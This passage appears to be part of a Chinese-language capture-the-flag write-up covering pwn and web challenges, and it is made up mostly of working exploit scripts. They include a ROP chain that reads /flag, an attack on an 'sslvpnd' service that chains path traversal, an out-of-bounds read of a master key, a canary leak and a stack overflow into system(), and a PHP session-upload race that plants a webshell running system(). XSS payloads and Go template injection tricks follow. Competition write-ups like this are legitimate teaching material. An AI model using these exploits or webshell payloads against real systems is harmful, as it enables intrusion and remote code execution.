bin_addr=<span class="hljs-number">0x00007ffff7ffba40</span>-<span class="hljs-number">0x7ffff7f4b000</span>+baseedit(<span class="hljs-number">5</span>,<span class="hljs-number">0x80000000</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x20</span>)+p64(bin_addr)+p64(victim)+p64(<span class="hljs-number">0x20</span>)[:-<span class="hljs-number">1</span>])
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#6</span>
edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x80000000</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x20</span>)+p64(victim)+p64(bin_addr)+p64(<span class="hljs-number">0x20</span>)[:-<span class="hljs-number">1</span>])
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#8</span>
add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#10</span>


leave=<span class="hljs-number">0x0000000000016992</span>+base
yyds=<span class="hljs-number">0x7ffff7fa9b30</span>-<span class="hljs-number">0x7ffff7f4b000</span>+base
add10=<span class="hljs-number">0x0000000000078aea</span>+base
ret=<span class="hljs-number">0x7ffff7f61993</span>-<span class="hljs-number">0x7ffff7f4b000</span>+base
rax=<span class="hljs-number">0x0000000000016a16</span>+base
rdi=<span class="hljs-number">0x0000000000015291</span>+base
rsi=<span class="hljs-number">0x000000000001d829</span>+base
rdx=<span class="hljs-number">0x000000000002cdda</span>+base
system=<span class="hljs-number">323456</span>+base
sys=<span class="hljs-number">0x7ffff7f94899</span>-<span class="hljs-number">0x7ffff7f4b000</span>+base
payload=<span class="hljs-string">b&#x27;/flag\0\0\0&#x27;</span>+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(sys)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(rsi)+p64(victim-<span class="hljs-number">0x100</span>)+p64(add10)+p64(leave)+p64(<span class="hljs-number">0xbadbabe</span>)
test=<span class="hljs-number">0x0000000000078aea</span>+base
payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rdx)+p64(<span class="hljs-number">0x100</span>)+p64(test)<span class="hljs-comment">#payload+=p64(rdi)+p64(3)+p64(rsi)+p64(victim+0x10)+p64(test)</span>
<span class="hljs-comment">#payload+=p64(0)*2+p64(rdx)+p64(0x100)+p64(rax)+p64(1)+p64(rdi)+p64(1)+p64(sys)</span>
payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(sys)+p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(sys)
<span class="hljs-comment">#payload=b&#x27;/bin/sh\0&#x27;+p64(rax)+p64(2)+p64(sys)+p64(rax)+p64(0)+p64(rdi)+p64(victim+0x10)+p64(add10)+p64(leave)+p64(0xbadbabe)+p64(ret)*1+p64(puts)</span>
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))
edit(<span class="hljs-number">10</span>,<span class="hljs-number">0x80000000</span>,payload)<span class="hljs-comment">#gdb.attach(p,&#x27;b *0x7ffff7fa5c4b&#x27;)</span>
cmd(<span class="hljs-number">5</span>)
p.interactive()</code></pre><h3 id="ioa"><a class="header-link" href="#ioa"></a>IOA</h3>
<p>先用urlencode绕目录穿越的过滤，读到user.txt里的用户名密码，用账号密码登录。</p>
<p>然后用vip bitmap操作的负数下标越界访问到bss上的内容。读master_key，改dhcp_pool，用req_vip的整数截断leak canary，在req_vip里栈溢出。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span>
    p = remote(<span class="hljs-string">&#x27;111.186.58.249&#x27;</span>, <span class="hljs-number">32766</span>, ssl=<span class="hljs-literal">True</span>)

    content = <span class="hljs-string">b&#x27;name=rea1user&amp;passwd=re4lp4ssw0rd&#x27;</span>
    total = <span class="hljs-built_in">len</span>(content)
    raw = <span class="hljs-string">b&#x27;&#x27;</span>
    raw += <span class="hljs-string">b&#x27;POST /login HTTP/1.1\r\n&#x27;</span>
    raw += <span class="hljs-string">b&#x27;Content-Length: &#x27;</span> + <span class="hljs-built_in">str</span>(total).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>) + <span class="hljs-string">b&#x27;\r\n&#x27;</span>
    raw += <span class="hljs-string">b&#x27;\r\n&#x27;</span>
    raw += content

    p.send(raw)

    p.recvuntil(<span class="hljs-string">b&#x27;login success&#x27;</span>)
    <span class="hljs-keyword">return</span> p

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrap1</span>(<span class="hljs-params">data</span>):</span>
    <span class="hljs-keyword">return</span> p32(<span class="hljs-number">0xDEADBEEF</span>) + p16(<span class="hljs-built_in">len</span>(data) + <span class="hljs-number">6</span>, endian=<span class="hljs-string">&#x27;big&#x27;</span>) + data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wip</span>(<span class="hljs-params">a, b, c, d</span>):</span>
    <span class="hljs-keyword">return</span> p8(a) + p8(b) + p8(c) + p8(d)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_vip</span>(<span class="hljs-params">p, val</span>):</span>
    p.send(wrap1(p16(<span class="hljs-number">3</span>) + p32(val, endian = <span class="hljs-string">&#x27;big&#x27;</span>)))
    buf = p.recvn(<span class="hljs-number">0xC</span>)
    <span class="hljs-keyword">return</span> u32(buf[-<span class="hljs-number">4</span>:])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">req_vip</span>(<span class="hljs-params">p, val</span>):</span>
    p.send(wrap1(p16(<span class="hljs-number">1</span>) + p32(val, endian = <span class="hljs-string">&#x27;big&#x27;</span>)))
    <span class="hljs-keyword">assert</span> p.recvn(<span class="hljs-number">4</span>) == p32(<span class="hljs-number">0xDEADBEEF</span>)
    buf = p.recvn(<span class="hljs-number">2</span>)
    <span class="hljs-keyword">assert</span> p.recvn(<span class="hljs-number">2</span>) == p16(<span class="hljs-number">1</span>)

    sz = u16(buf, endian=<span class="hljs-string">&#x27;big&#x27;</span>)
    buf = p.recvn(sz - <span class="hljs-number">8</span>)
    
    <span class="hljs-keyword">return</span> buf[<span class="hljs-number">16</span>:]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kickout</span>(<span class="hljs-params">p, val, key</span>):</span>
    p.send(wrap1(p16(<span class="hljs-number">4</span>) + p32(val, endian = <span class="hljs-string">&#x27;big&#x27;</span>) + key))
    buf = p.recvn(<span class="hljs-number">0xC</span>)
    <span class="hljs-keyword">return</span> u32(buf[-<span class="hljs-number">4</span>:])



progbase = <span class="hljs-number">0x5650d5f47000</span>

<span class="hljs-comment"># delta = heap abs addr - progbase</span>
delta = <span class="hljs-number">0x5650d7d95640</span> - progbase
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(delta))


prog = ELF(<span class="hljs-string">&#x27;./sslvpnd&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">calc_off</span>(<span class="hljs-params">addr</span>):</span>
    off = (delta - (addr - prog.address)) * <span class="hljs-number">8</span>
    <span class="hljs-keyword">return</span> off

key_off = calc_off(prog.sym[<span class="hljs-string">&#x27;master_key&#x27;</span>])

master = login()

baseip = u32(wip(<span class="hljs-number">172</span>, <span class="hljs-number">31</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), endian = <span class="hljs-string">&#x27;big&#x27;</span>)

out = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x40</span>):
    r = check_vip(master, baseip - key_off + i)
    out |= (r ^ <span class="hljs-number">1</span>) &lt;&lt; i

key = p64(out)
<span class="hljs-built_in">print</span>(key.<span class="hljs-built_in">hex</span>())
master_key = key


tworkers = []

<span class="hljs-comment"># write dhcp_pool.cnt to negative</span>
off = calc_off(prog.sym[<span class="hljs-string">&#x27;dhcp_pool&#x27;</span>] + <span class="hljs-number">0x18</span>)
buf = <span class="hljs-number">0x80000021</span>
ori = <span class="hljs-number">1</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">31</span>, <span class="hljs-number">5</span>]:
    kickout(master, baseip - off + i, master_key)



<span class="hljs-comment"># leak stack</span>
t = login()
buf = req_vip(t, baseip + <span class="hljs-number">3</span>)
tworkers.append(t)

canary = buf[<span class="hljs-number">0x80</span>:<span class="hljs-number">0x80</span> + <span class="hljs-number">8</span>]
<span class="hljs-built_in">print</span>(canary.<span class="hljs-built_in">hex</span>())



<span class="hljs-comment"># fixup</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">5</span>, <span class="hljs-number">31</span>]:
    t = login()
    req_vip(t, baseip - off + i)
    tworkers.append(t)



<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_buf</span>(<span class="hljs-params">off, buf, old = <span class="hljs-literal">None</span></span>):</span>
    <span class="hljs-keyword">if</span> old <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        old = <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">len</span>(buf))

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(buf)):
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
            a = (buf[i] &gt;&gt; j) &amp; <span class="hljs-number">1</span>   
            b = (old[i] &gt;&gt; j) &amp; <span class="hljs-number">1</span>  
            o = baseip - off + (i * <span class="hljs-number">8</span> + j)
            <span class="hljs-keyword">if</span> a != b:
                <span class="hljs-keyword">if</span> a == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> b == <span class="hljs-number">0</span>:
                    kickout(master, o, master_key)
                <span class="hljs-keyword">else</span>:
                    t = login()
                    req_vip(t, o)
                    tworkers.append(t)


write_buf(calc_off(<span class="hljs-number">0x10600</span>), <span class="hljs-string">b&#x27;./getflag&gt;/tmp/swtql&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">g</span>(<span class="hljs-params">t</span>):</span>
    t = t[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>][::-<span class="hljs-number">1</span>] + t[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>][::-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> t

pop_rdi = progbase + <span class="hljs-number">0xCAC3</span>
ret = progbase + <span class="hljs-number">0xCAC4</span>
command = progbase + <span class="hljs-number">0x10600</span>
system_plt = progbase + (prog.plt[<span class="hljs-string">&#x27;system&#x27;</span>] - prog.address)
write_buf(calc_off(<span class="hljs-number">0x10640</span>), g(canary) + g(p64(pop_rdi)) + g(p64(command)) + g(p64(ret)) + g(p64(system_plt)))


pad = p64(progbase)
buf = <span class="hljs-string">b&#x27;&#x27;</span>
buf += pad * <span class="hljs-number">16</span> + p64(progbase + <span class="hljs-number">0x10640</span>)
buf += pad * <span class="hljs-number">3</span> + p64(progbase + <span class="hljs-number">0x10640</span> + <span class="hljs-number">8</span>) + p64(progbase + <span class="hljs-number">0x10640</span> + <span class="hljs-number">0x10</span>) + p64(progbase + <span class="hljs-number">0x10640</span> + <span class="hljs-number">0x18</span>) + p64(progbase + <span class="hljs-number">0x10640</span> + <span class="hljs-number">0x20</span>)

write_buf(calc_off(prog.sym[<span class="hljs-string">&#x27;dhcp_pool&#x27;</span>] + <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span>), buf)

off = calc_off(prog.sym[<span class="hljs-string">&#x27;dhcp_pool&#x27;</span>] + <span class="hljs-number">0x18</span>)
write_buf(off, p32(<span class="hljs-number">0x19</span>), p32(<span class="hljs-number">1</span>))

req_vip(master, baseip + <span class="hljs-number">10</span>)</code></pre><pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>

p = remote(<span class="hljs-string">&#x27;111.186.58.249&#x27;</span>, <span class="hljs-number">32766</span>, ssl=<span class="hljs-literal">True</span>)

path = <span class="hljs-string">&#x27;../user.txt&#x27;</span>
path = <span class="hljs-string">&#x27;../../tmp/swtql&#x27;</span>

uri = urlencode(path).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)
raw = <span class="hljs-string">b&#x27;&#x27;</span>
raw += <span class="hljs-string">b&#x27;&#x27;&#x27;GET &#x27;&#x27;&#x27;</span> + uri + <span class="hljs-string">b&#x27;&#x27;&#x27; HTTP/1.1\r\n&#x27;&#x27;&#x27;</span>
raw += <span class="hljs-string">b&#x27;\r\n&#x27;</span>

p.send(raw)
out = p.recvall()
out = out.partition(<span class="hljs-string">b&#x27;\r\n\r\n&#x27;</span>)[-<span class="hljs-number">1</span>]
<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(out)</code></pre><p>Leak坑在于远程堆layout不同</p>
<pre class="hljs"><code><span class="hljs-comment"># leak.py</span>
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

debug = <span class="hljs-number">0</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>() -&gt; remote:</span>
    <span class="hljs-keyword">if</span> debug:
        p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">443</span>, ssl=<span class="hljs-literal">True</span>, level=<span class="hljs-string">&#x27;error&#x27;</span>)
    <span class="hljs-keyword">else</span>:
        p = remote(<span class="hljs-string">&#x27;111.186.58.249&#x27;</span>, <span class="hljs-number">36717</span>, ssl=<span class="hljs-literal">True</span>, level=<span class="hljs-string">&#x27;error&#x27;</span>)
    data = <span class="hljs-string">&#x27;name=rea1user&amp;passwd=re4lp4ssw0rd&#x27;</span>
    packet = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /login HTTP/1.1
Content-Length: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(data)}</span>

<span class="hljs-subst">{data}</span>&#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;\r\n&#x27;</span>)
    p.send(packet)
    p.recvuntil(<span class="hljs-string">&#x27;success&#x27;</span>)
    <span class="hljs-keyword">return</span> p


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrap</span>(<span class="hljs-params">data</span>):</span>
    <span class="hljs-keyword">return</span> p32(<span class="hljs-number">0xdeadbeef</span>) + p16(<span class="hljs-built_in">len</span>(data) + <span class="hljs-number">6</span>, endian=<span class="hljs-string">&#x27;big&#x27;</span>) + data


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_vip</span>(<span class="hljs-params">p, val, pack_only=<span class="hljs-literal">False</span></span>):</span>
    packet = wrap(p16(<span class="hljs-number">3</span>) + p32(val, endian=<span class="hljs-string">&#x27;big&#x27;</span>))
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pack_only:
        p.send(packet)
        buf = p.recvn(<span class="hljs-number">0xC</span>)
        <span class="hljs-keyword">return</span> u32(buf[-<span class="hljs-number">4</span>:])
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> packet


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">req_vip</span>(<span class="hljs-params">p, val, pack_only=<span class="hljs-literal">False</span></span>):</span>
    packet = wrap(p16(<span class="hljs-number">1</span>) + p32(val, endian=<span class="hljs-string">&#x27;big&#x27;</span>))
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pack_only:
        p.send(packet)
        buf = p.recvn(<span class="hljs-number">4</span>)
        buf = p.recvn(<span class="hljs-number">2</span>)
        sz = u16(buf, endian=<span class="hljs-string">&#x27;big&#x27;</span>)
        buf = p.recvn(sz - <span class="hljs-number">6</span>)

        <span class="hljs-keyword">return</span> u32(buf[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>])
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> packet


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ip2long</span>(<span class="hljs-params">ip</span>):</span>
    <span class="hljs-string">&quot;&quot;&quot;
    Convert an IP string to long
    &quot;&quot;&quot;</span>
    packedIP = socket.inet_aton(ip)
    <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&quot;!L&quot;</span>, packedIP)[<span class="hljs-number">0</span>]


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">p, off, sz=<span class="hljs-number">8</span></span>):</span>
    data = []
    off &lt;&lt;= <span class="hljs-number">3</span>
    packets = <span class="hljs-string">b&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, sz * <span class="hljs-number">8</span>, <span class="hljs-number">8</span>):
        <span class="hljs-comment"># out = 0</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
            packets += check_vip(p, base - i - j - <span class="hljs-number">1</span> - off, pack_only=<span class="hljs-literal">True</span>)

    p.send(packets)
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, sz * <span class="hljs-number">8</span>, <span class="hljs-number">8</span>):
        out = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):
            buf = p.recvn(<span class="hljs-number">0xC</span>)
            r = u32(buf[-<span class="hljs-number">4</span>:])
            out &lt;&lt;= <span class="hljs-number">1</span>
            out |= r ^ <span class="hljs-number">1</span>
        data.append(out)
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytearray</span>(data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kickout</span>(<span class="hljs-params">p, val</span>):</span>
    <span class="hljs-keyword">global</span> mkey
    p.send(wrap(p16(<span class="hljs-number">4</span>) + p32(val, endian=<span class="hljs-string">&#x27;big&#x27;</span>) + mkey))
    buf = p.recvn(<span class="hljs-number">0xC</span>)
    <span class="hljs-keyword">return</span> u32(buf[-<span class="hljs-number">4</span>:])

m = login()
base = ip2long(<span class="hljs-string">&#x27;172.31.0.0&#x27;</span>)
crash_first = <span class="hljs-literal">True</span>
<span class="hljs-keyword">if</span> crash_first:
    <span class="hljs-keyword">try</span>:
        check_vip(m, base - <span class="hljs-number">0xffffff</span>)  <span class="hljs-comment"># force restart</span>
    <span class="hljs-keyword">except</span>:
        m.close()

    m = login()

<span class="hljs-keyword">if</span> debug:
    heap_param = <span class="hljs-number">15</span>
    heap = <span class="hljs-number">0</span>
    cb = <span class="hljs-number">0x5651eaa9f000</span>
<span class="hljs-keyword">else</span>:
    heap_param = <span class="hljs-number">33</span>
    heap = <span class="hljs-number">0</span>
    cb = <span class="hljs-number">0</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> heap:
    <span class="hljs-comment"># for x in range(0x100):</span>
    data = leak(m, heap_param * <span class="hljs-number">16</span>, <span class="hljs-number">8</span>)
    heap = u64(data[:<span class="hljs-number">8</span>], endian=<span class="hljs-string">&#x27;big&#x27;</span>) + <span class="hljs-number">0xc0</span> + (heap_param - <span class="hljs-number">15</span>) * <span class="hljs-number">0x10</span>

log.success(<span class="hljs-string">f&#x27;heap: 0x<span class="hljs-subst">{heap:x}</span>&#x27;</span>)

<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cb:
    heap_off = heap &amp; <span class="hljs-number">0xffff</span>
    t = <span class="hljs-number">3</span>
    pro = log.progress(<span class="hljs-string">&#x27;Leaking base...&#x27;</span>)
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">try</span>:
            t += <span class="hljs-number">1</span>
            tmp = login()
            pro.status(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...&#x27;</span>)
            off = heap_off + <span class="hljs-number">0x10000</span> * t
            off &lt;&lt;= <span class="hljs-number">3</span>
            check_vip(tmp, base - off)
            pro.success(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...success&#x27;</span>)
            cb = heap - heap_off - <span class="hljs-number">0x10000</span> * t
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">except</span> KeyboardInterrupt:
            sys.exit(<span class="hljs-number">0</span>)
        <span class="hljs-keyword">except</span>:
            pro.status(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...Fail&#x27;</span>)
        <span class="hljs-keyword">finally</span>:
            tmp.close()

    pro = log.progress(<span class="hljs-string">&#x27;Leaking accurate base...&#x27;</span>)
    heap_off = heap - cb
    t = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">try</span>:
            tmp = login()
            pro.status(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...&#x27;</span>)
            off = heap_off + <span class="hljs-number">0x1000</span> * t
            t += <span class="hljs-number">1</span>
            off &lt;&lt;= <span class="hljs-number">3</span>
            check_vip(tmp, base - off)
            pro.status(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...Fail&#x27;</span>)
        <span class="hljs-keyword">except</span> KeyboardInterrupt:
            sys.exit(<span class="hljs-number">0</span>)
        <span class="hljs-keyword">except</span>:
            pro.success(<span class="hljs-string">f&#x27;Try <span class="hljs-subst">{t}</span>...success&#x27;</span>)
            cb = heap - heap_off - <span class="hljs-number">0x1000</span> * t
            <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">finally</span>:
            tmp.close()
    cb += <span class="hljs-number">0x2000</span>
    log.success(<span class="hljs-string">f&#x27;base: 0x<span class="hljs-subst">{cb:x}</span>&#x27;</span>)

w = login()
pprint(leak(w, heap - cb - <span class="hljs-number">8</span>))
m.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
<h3 id="1linephp"><a class="header-link" href="#1linephp"></a>1linephp</h3>
<p>调整 Zip 偏移，使其开头能够包含 upload_progress_</p>
<p>PHP_SESSION_UPLOAD_PROGRESS 上传 + 文件包含漏洞 进行条件竞争。</p>
<p>完整的 EXP：</p>
<pre class="hljs"><code><span class="hljs-comment">#encoding:utf-8</span>
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> os, sys

cmd = <span class="hljs-string">&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>

poc = <span class="hljs-string">&#x27;&#x27;&#x27;@&lt;?php
echo &quot;evoA yyds&quot;;
system(&#x27;%s&#x27;);
?&gt;&#x27;&#x27;&#x27;</span> % cmd

f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.php&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)
f.write(poc)
f.close()

os.system(<span class="hljs-string">&#x27;rm -rf shell.zip;zip shell.zip shell.php&#x27;</span>)

f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shell.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)
ZipContent = f.read()
f.close()

central_directory_idx = ZipContent.index(<span class="hljs-string">b&#x27;\x50\x4B\x01\x02&#x27;</span>)
end_central_directory_idx = ZipContent.index(<span class="hljs-string">b&#x27;\x50\x4B\x05\x06&#x27;</span>)

<span class="hljs-comment"># 文件开头</span>
file_local_header = ZipContent[:central_directory_idx]
<span class="hljs-comment"># 核心目录</span>
central_directory = ZipContent[central_directory_idx:end_central_directory_idx]
<span class="hljs-comment"># 结束</span>
end_central_directory = ZipContent[end_central_directory_idx:]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetHeaderOffset</span>():</span>
    <span class="hljs-keyword">return</span> u32(central_directory[<span class="hljs-number">42</span>:<span class="hljs-number">46</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SetHeaderOffset</span>(<span class="hljs-params">offset</span>):</span>
    <span class="hljs-keyword">return</span> central_directory[:<span class="hljs-number">42</span>] + p32(offset) + central_directory[<span class="hljs-number">46</span>:]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetArchiveOffset</span>():</span>
    <span class="hljs-keyword">return</span> u32(end_central_directory[<span class="hljs-number">16</span>:<span class="hljs-number">20</span>])

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">SetArchiveOffset</span>(<span class="hljs-params">offset</span>):</span>
    <span class="hljs-keyword">return</span> end_central_directory[:<span class="hljs-number">16</span>] + p32(offset) + end_central_directory[<span class="hljs-number">20</span>:]

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Create</span>(<span class="hljs-params">start, end</span>):</span>
    length = <span class="hljs-built_in">len</span>(start)
    HeaderOffset = SetHeaderOffset(length + GetHeaderOffset())
    ArchiveOffset = SetArchiveOffset(length + GetArchiveOffset())

    NewZipContent = file_local_header + HeaderOffset + ArchiveOffset

    <span class="hljs-keyword">return</span> NewZipContent

start = <span class="hljs-string">b&#x27;upload_progress_&#x27;</span>
end = <span class="hljs-string">b&#x27;|a:5:{s:10:&quot;start_time&quot;;i:1625309087;s:14:&quot;content_length&quot;;i:336;s:15:&quot;bytes_processed&quot;;i:336;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:13:&quot;callmecro.txt&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1625309087;s:15:&quot;bytes_processed&quot;;i:336;}}}&#x27;</span>

ZipContent = Create(start, end)
f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;shell.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)
f.write(ZipContent)
f.close()

sessid = <span class="hljs-string">&#x27;callmecro&#x27;</span>
url = <span class="hljs-string">&#x27;http://111.186.59.2:50081/&#x27;</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)
        r = session.post(url, data={<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: ZipContent}, files={<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;callmecro.txt&#x27;</span>,f)}, cookies={<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid})

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        r = session.post(url+<span class="hljs-string">&#x27;?yxxx=zip:///tmp/sess_&#x27;</span>+sessid+<span class="hljs-string">&#x27;%23&#x27;</span>+<span class="hljs-string">&#x27;shell&#x27;</span>, data={})
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;@evoA yyds&#x27;</span> <span class="hljs-keyword">in</span> r.text:
            <span class="hljs-built_in">print</span>(r.text.strip(<span class="hljs-string">&#x27;@evoA yyds&#x27;</span>))
            event.clear()
            sys.exit()


event=threading.Event()
<span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
        threading.Thread(target=write,args=(session,)).start()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):
        threading.Thread(target=read,args=(session,)).start()
event.<span class="hljs-built_in">set</span>()</code></pre><h3 id="worldcup"><a class="header-link" href="#worldcup"></a>Worldcup</h3>
<p>第一层：<code>nickname=&lt;`&#39;`+`，msg= `};alert(1)// &lt;/code&gt;</code></p>
<pre class="hljs"><code><span class="hljs-attribute">set</span> cookie: level<span class="hljs-number">1</span> NoQWeCy<span class="hljs-number">70</span>QekDB<span class="hljs-number">5</span>b</code></pre><p>第二层： <code>nickname= `&#39;`};(`，msg= `);alert(1)// &lt;/code&gt;</code></p>
<pre class="hljs"><code><span class="hljs-attribute">set</span> cookie: level<span class="hljs-number">2</span> Autx<span class="hljs-number">5</span>F<span class="hljs-number">53</span>FmmSFayM</code></pre><p>Golang text/template 的 SSTI：</p>
<p><code>{{$}}</code> 可以看到所有变量</p>
<p><code>?bet=&lt;@urlencode&gt;1{{if lt .o0ps_u_Do1nt_no_t1 .o0ps_u_Do1nt_no_t2}}{{.z &quot;z&quot;}}{{end}}&lt;@/urlencode&gt;</code> t1&lt;t2的时候用不存在的 <code>{{.z &quot;z&quot;}}</code> 报错，这样猜错就不会扣钱了，猜对+10$</p>
<p class="img-container"><img src="./pngs/worldcup_exp.png" alt="img"></p>
